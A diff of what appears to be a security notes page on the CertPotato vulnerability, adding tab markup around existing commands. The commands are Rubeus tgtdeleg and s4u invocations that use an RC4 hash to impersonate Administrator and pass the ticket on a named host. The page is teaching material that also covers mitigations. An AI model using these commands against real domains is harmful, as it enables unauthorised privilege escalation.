@@ -30,6 +30,10 @@ Understanding and mitigating the risks associated with the CertPotato vulnerabil
 
 We can request a TGT for the machine account without needing admin rights using the tgtdeleg trick.
 
+
+
+{% tabs %}
+{% tab title="Windows" %}
 ```
 Rubeus.exe tgtdeleg /nowrap
 ```
@@ -38,6 +42,16 @@ Rubeus.exe tgtdeleg /nowrap
 Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/cb-webapp1.certbulk.cb.corp
 /dc:cb-dc.certbulk.cb.corp /user:'cb-webapp1$' /rc4:B2FCBA1C3570AB9418994799B9BC985A /ptt
 ```
+{% endtab %}
+
+{% tab title="Linux" %}
+```
+// Some code
+```
+{% endtab %}
+{% endtabs %}
+
+
 
 ### Mitigation Strategies for CertPotato Vulnerability
 
